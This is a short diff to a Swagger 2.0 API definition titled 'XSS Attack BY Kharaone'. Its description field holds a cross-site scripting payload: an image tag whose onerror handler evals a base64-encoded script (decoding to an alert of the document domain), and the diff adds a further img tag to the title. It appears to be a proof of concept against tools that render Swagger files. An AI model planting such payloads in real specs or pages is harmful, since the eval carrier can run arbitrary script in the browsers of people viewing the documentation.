@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY Kharaone
+  title: XSS Attack BY Kharaone<img src=x>
   description: |
     <img src=x id='YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==' onerror='eval(atob(this.id))'>
 
